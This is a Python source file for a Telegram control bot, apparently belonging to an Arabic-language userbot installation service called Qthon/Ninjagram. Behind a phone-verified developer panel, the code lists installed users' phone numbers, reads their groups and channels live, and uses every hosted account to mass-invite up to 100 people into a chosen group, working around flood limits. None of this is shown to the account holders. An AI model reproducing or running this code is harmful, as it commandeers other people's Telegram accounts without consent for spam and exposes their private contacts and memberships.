# bot.py
import asyncio, uuid, os
from telethon import TelegramClient, events, Button
from telethon.errors import FloodWaitError
from telethon.tl.functions.channels import InviteToChannelRequest
from shared import *
from collections import Counter

bot = TelegramClient(f'bot_session_{uuid.uuid4().hex[:6]}', BOT_API_ID, BOT_API_HASH)

START_IMAGE = "start.jpg"

allowed_chats = set()

ALLOWED_KEYWORDS = ["Qthon", "تيليثون", "لوحة تحكم", "طريقة جلب", "التحقق من المطور",
                    "تم التحقق", "فشل التحقق", "التحقق معطل", "خيارات المطور",
                    "المستخدمين", "النشطاء", "أكثر الأوامر", "المجموعات", "القنوات",
                    "إذاعة", "رجوع", "قريباً", "غير مصرح", "تم تفعيل",
                    "جاري إضافة", "تم بدء الإضافة", "فشل الإضافة", "تم إيقاف",
                    "توقف", "لا توجد جلسات", "تم الإضافة", "إيقاف مستخدم",
                    "أرسل رقم", "تنصيب", "راسل المطور", "تم إرجاع", "إرجاع مستخدم",
                    "تم إيقاف التنصيب", "المستخدمين الموقوفين", "موقوف",
                    "بدء التنصيب", "اختر خياراً"]

def is_allowed_text(text):
    if not text:
        return False
    for keyword in ALLOWED_KEYWORDS:
        if keyword in text:
            return True
    return False

def dev_panel_markup():
    lock_text = "فتح خيارات المطور" if dev_access_locked else "قفل خيارات المطور"
    return [
        [Button.inline("👥 عدد المستخدمين", b"dev_users"),
         Button.inline("🟢 النشطاء حالياً", b"dev_active")],
        [Button.inline("📊 أكثر الأوامر", b"dev_topcmd"),
         Button.inline("📋 قائمة المجموعات", b"dev_groups")],
        [Button.inline("📢 قائمة القنوات", b"dev_channels"),
         Button.inline("📣 إذاعة", b"dev_broadcast")],
        [Button.inline("➕ إضافة أعضاء لجروب", b"dev_addto"),
         Button.inline("⛔ إيقاف مستخدم", b"dev_stopuser")],
        [Button.inline("🔄 إرجاع مستخدم", b"dev_unblockuser")],
        [Button.inline(lock_text, b"dev_lock")],
    ]

@bot.on(events.NewMessage(outgoing=True))
async def block_unauthorized(event):
    if event.chat_id not in allowed_chats:
        await event.delete()
        return
    if not is_allowed_text(event.text):
        await event.delete()
        return

@bot.on(events.NewMessage(pattern='/start'))
async def bot_start(event):
    allowed_chats.add(event.chat_id)
    user_id = event.sender_id

    if is_dev(user_id):
        await bot.send_message(
            event.chat_id,
            "**🜲 لوحة تحكم Ninjagram**\n\nاختر خياراً من القائمة.",
            buttons=dev_panel_markup(),
            parse_mode='md'
        )
        return

    buttons = [
        [Button.url("بدء التنصيب", "https://t.me/nj_rm_bot?profile")]
    ]
    caption = (
        "**• لبدء تنصيب تيليثون نينجاغࢪام 🜲**\n"
        "**- اضغط بدء التنصيب ليظهر تطبيق البوت **\n"
        "**- اضفط علي فتح التطبيق كما فالصورة **"
    )

    if os.path.exists(START_IMAGE):
        await bot.send_file(event.chat_id, file=START_IMAGE, caption=caption, buttons=buttons, parse_mode='md')
    else:
        await bot.send_message(event.chat_id, caption, buttons=buttons, parse_mode='md')

@bot.on(events.CallbackQuery(data=b"how_to_get_data"))
async def how_to_get_data(event):
    allowed_chats.add(event.chat_id)
    await event.answer(
        "🔹 **طريقة جلب بيانات API:**\n\n"
        "1. افتح المتصفح واذهب إلى:\n   my.telegram.org\n\n"
        "2. أدخل رقم هاتفك الدولي\n   مثال: +2010xxxxxxxx\n\n"
        "3. ستستلم رمز تحقق في تيليجرام، أدخله في الموقع.\n\n"
        "4. بعد الدخول، اختر: «API development tools»\n\n"
        "5. املأ النموذج:\n"
        "   - App title: أي اسم (مثلاً Qthon)\n"
        "   - Short name: اسم قصير (مثلاً qthon)\n"
        "   - Platform: اختر «Desktop»\n\n"
        "6. اضغط «Create application» سيظهر لك:\n"
        "   • api_id (رقم)\n"
        "   • api_hash (نص طويل)\n\n"
        "7. انسخهما واستخدمهما في موقع التنصيب.",
        alert=True)

@bot.on(events.CallbackQuery(data=b"dev_login"))
async def dev_login(event):
    allowed_chats.add(event.chat_id)
    if not is_dev(event.sender_id):
        await event.answer("غير مصرح", alert=True)
        return
    pending_verify[event.sender_id] = True
    buttons = [[Button.request_phone("مشاركة رقم الهاتف", resize=True)]]
    await event.edit("**التحقق من المطور**\n\nشارك رقم هاتفك للتحقق كمالك.", buttons=buttons, parse_mode='md')
    await event.answer()

@bot.on(events.NewMessage(func=lambda e: e.message.contact or e.sender_id in pending_verify))
async def handle_phone_verify(event):
    allowed_chats.add(event.chat_id)
    user_id = event.sender_id
    if user_id not in pending_verify:
        return
    if dev_access_locked and not is_dev(user_id):
        del pending_verify[user_id]
        await event.respond("**التحقق معطل حالياً**\nخيارات المطور مقفلة.", parse_mode='md')
        return
    phone = (f"+{event.message.contact.phone_number}" if event.message.contact
             else event.text.strip().replace("+", ""))
    if not phone.startswith('+'): phone = f"+{phone}"
    if phone == DEV_PHONE:
        verified_devs.add(user_id)
        del pending_verify[user_id]
        await event.respond("**تم التحقق من الهوية!**\n\nمرحباً بك في لوحة التحكم.",
                            buttons=dev_panel_markup(), parse_mode='md')
        await notify_dev(f"تم تفعيل مطور جديد: {phone}")
    else:
        await event.respond("**فشل التحقق**\nرقم الهاتف غير مطابق.", parse_mode='md')

pending_input = {}

@bot.on(events.CallbackQuery())
async def dev_callback(event):
    allowed_chats.add(event.chat_id)
    data = event.data.decode()
    if not is_dev(event.sender_id):
        await event.answer("غير مصرح", alert=True)
        return

    if data == "dev_back":
        await event.edit("**🜲 لوحة تحكم Qthon**\n\nاختر خياراً.", buttons=dev_panel_markup(), parse_mode='md')
        await event.answer()
        return

    if data == "dev_lock":
        global dev_access_locked
        dev_access_locked = not dev_access_locked
        state = "مقفلة" if dev_access_locked else "مفتوحة"
        await event.answer(f"خيارات المطور الآن {state}", alert=True)
        await event.edit("**🜲 لوحة تحكم Qthon**\n\nاختر خياراً.", buttons=dev_panel_markup(), parse_mode='md')
        return

    if data == "dev_addto":
        pending_input[event.sender_id] = "addto"
        await event.edit(
            "**➕ إضافة أعضاء لجروب**\n\n• أرسل يوزر الجروب المستهدف\n• مثال: `@group_username`\n\n• سيتم إضافة 100 عضو من كل حساب نشط",
            buttons=[[Button.inline("رجوع", b"dev_back")]], parse_mode='md')
        await event.answer()
        return

    if data == "dev_stopuser":
        pending_input[event.sender_id] = "stopuser"
        msg = "**⛔ إيقاف مستخدم**\n\n• أرسل رقم تليفون المستخدم\n• مثال: `+2010xxxxxxxx`\n\n"
        for phone, info in user_info_cache.items():
            name = info.get('first_name', 'غير معروف')
            uname = f" @{info['username']}" if info.get('username') else ""
            active_status = "🟢" if phone in active_clients else "🔴"
            blocked_status = " ⛔موقوف" if phone in blocked_users else ""
            msg += f"• {active_status} `{phone}` → {name}{uname}{blocked_status}\n"
        await event.edit(msg, buttons=[[Button.inline("رجوع", b"dev_back")]], parse_mode='md')
        await event.answer()
        return

    if data == "dev_unblockuser":
        if not blocked_users:
            await event.answer("لا يوجد مستخدمين موقوفين", alert=True)
            return
        msg = "**🔄 إرجاع مستخدم**\n\n• أرسل رقم تليفون المستخدم لإرجاعه\n• مثال: `+2010xxxxxxxx`\n\n**المستخدمين الموقوفين:**\n"
        for phone in blocked_users:
            info = user_info_cache.get(phone, {})
            name = info.get('first_name', phone)
            msg += f"• `{phone}` → {name}\n"
        pending_input[event.sender_id] = "unblockuser"
        await event.edit(msg, buttons=[[Button.inline("رجوع", b"dev_back")]], parse_mode='md')
        await event.answer()
        return

    if data == "dev_users":
        total = len(active_clients)
        msg = f"**👥 إجمالي المستخدمين المسجلين:** {total}\n\n"
        for phone, info in user_info_cache.items():
            username = f"@{info['username']}" if info['username'] else "بدون معرف"
            blocked_status = " ⛔موقوف" if phone in blocked_users else ""
            msg += f"• {info['first_name']} | {username} | {phone}{blocked_status}\n"
        if not user_info_cache:
            msg += "لا يوجد مستخدمين."
        await event.edit(msg, parse_mode='md', buttons=[[Button.inline("رجوع", b"dev_back")]])

    elif data == "dev_active":
        active_count = len(active_clients)
        msg = f"**🟢 النشطاء حالياً:** {active_count}\n\n"
        for phone, client in active_clients.items():
            info = user_info_cache.get(phone, {})
            name = info.get('first_name', phone)
            uname = info.get('username')
            display = f"{name} - @{uname}" if uname else f"{name} - {phone}"
            msg += f"• {display}\n"
        if not active_clients:
            msg += "لا توجد جلسات نشطة."
        await event.edit(msg, parse_mode='md', buttons=[[Button.inline("رجوع", b"dev_back")]])

    elif data == "dev_topcmd":
        all_cmds = Counter()
        for cmds in command_stats.values():
            all_cmds.update(cmds)
        top = all_cmds.most_common(10)
        msg = "**📊 أكثر 10 أوامر استخداماً:**\n\n"
        for i, (cmd, cnt) in enumerate(top, 1):
            msg += f"{i}. .{cmd}: {cnt} مرة\n"
        if not top:
            msg += "لم تُستخدم أوامر بعد."
        await event.edit(msg, parse_mode='md', buttons=[[Button.inline("رجوع", b"dev_back")]])

    elif data == "dev_groups":
        msg = "**📋 المجموعات (حيّة):**\n\n"
        found = False
        for phone, client in active_clients.items():
            try:
                dialogs = await client.get_dialogs(limit=200)
                groups = [d for d in dialogs if d.is_group and not d.is_channel]
                if groups:
                    found = True
                    info = user_info_cache.get(phone, {})
                    name = info.get('first_name', phone)
                    msg += f"**{name}:**\n"
                    for g in groups[:10]:
                        msg += f"  • {g.name} (ID: {g.id})\n"
            except: pass
        if not found:
            msg += "لا توجد مجموعات."
        await event.edit(msg, parse_mode='md', buttons=[[Button.inline("رجوع", b"dev_back")]])

    elif data == "dev_channels":
        msg = "**📢 القنوات (حيّة):**\n\n"
        found = False
        for phone, client in active_clients.items():
            try:
                dialogs = await client.get_dialogs(limit=200)
                channels = [d for d in dialogs if d.is_channel and not d.is_group]
                if channels:
                    found = True
                    info = user_info_cache.get(phone, {})
                    name = info.get('first_name', phone)
                    msg += f"**{name}:**\n"
                    for c in channels[:10]:
                        msg += f"  • {c.name} (ID: {c.id})\n"
            except: pass
        if not found:
            msg += "لا توجد قنوات."
        await event.edit(msg, parse_mode='md', buttons=[[Button.inline("رجوع", b"dev_back")]])

    elif data == "dev_broadcast":
        await event.answer("قريباً", alert=True)

    await event.answer()


@bot.on(events.NewMessage(func=lambda e: e.sender_id in pending_input and not e.text.startswith('/')))
async def handle_pending_input(event):
    allowed_chats.add(event.chat_id)
    user_id = event.sender_id
    action = pending_input.pop(user_id, None)

    if action == "addto":
        group_username = event.text.strip().replace('@', '')
        if not group_username:
            await event.respond("**❌ يرجى إرسال يوزر صحيح**", parse_mode='md')
            return

        await event.respond(f"**🔄 جاري الإضافة إلى @{group_username}...**\nسيتم إضافة 100 عضو من كل حساب نشط.", parse_mode='md')
        total_added = 0
        failed = 0

        for phone, client in list(active_clients.items()):
            if not client or not client.is_connected():
                continue
            try:
                target_group = await client.get_entity(group_username)
                added = 0
                async for dialog in client.iter_dialogs():
                    if added >= 100: break
                    if dialog.is_group:
                        try:
                            async for user in client.iter_participants(dialog.id, limit=5):
                                if added >= 100: break
                                if user.bot or user.deleted: continue
                                try:
                                    await client(InviteToChannelRequest(target_group, [user.id]))
                                    added += 1; total_added += 1
                                    await asyncio.sleep(2)
                                except FloodWaitError as e: await asyncio.sleep(e.seconds + 1)
                                except: continue
                        except: continue
                info = user_info_cache.get(phone, {})
                logger.info(f"الحساب {info.get('first_name', phone)} أضاف {added} عضو إلى {group_username}")
            except Exception as e:
                failed += 1
                logger.error(f"فشل حساب {phone}: {str(e)[:100]}")

        await event.respond(
            f"**✅ تم الانتهاء من الإضافة إلى @{group_username}**\n\n"
            f"• إجمالي المضاف: **{total_added}** عضو\n"
            f"• حسابات فشلت: **{failed}**",
            parse_mode='md')

    elif action == "stopuser":
        phone_to_stop = event.text.strip()
        if not phone_to_stop.startswith('+'): phone_to_stop = f"+{phone_to_stop}"

        info = user_info_cache.get(phone_to_stop, {})
        name = info.get('first_name', phone_to_stop)

        if phone_to_stop in active_clients:
            try:
                client_to_stop = active_clients[phone_to_stop]
                await client_to_stop.disconnect()
            except: pass

        blocked_users.add(phone_to_stop)

        if phone_to_stop in active_clients:
            del active_clients[phone_to_stop]

        await event.respond(
            f"**⛔ تم إيقاف تنصيب {name}**\n`{phone_to_stop}`\n\n• تم إيقاف التنصيب عندك\n• راسل المطور @J0E_3",
            parse_mode='md')
        logger.info(f"تم إيقاف حساب {phone_to_stop} بواسطة المطور")

    elif action == "unblockuser":
        phone_to_unblock = event.text.strip()
        if not phone_to_unblock.startswith('+'): phone_to_unblock = f"+{phone_to_unblock}"

        if phone_to_unblock in blocked_users:
            blocked_users.discard(phone_to_unblock)
            info = user_info_cache.get(phone_to_unblock, {})
            name = info.get('first_name', phone_to_unblock)
            await event.respond(
                f"**✅ تم إرجاع المستخدم {name}**\n`{phone_to_unblock}`\n\n• يمكنه الآن إعادة التنصيب واستخدام الأوامر",
                parse_mode='md')
            logger.info(f"تم إرجاع حساب {phone_to_unblock} بواسطة المطور")
        else:
            await event.respond(
                f"**❌ الرقم `{phone_to_unblock}` غير موقوف**",
                parse_mode='md')
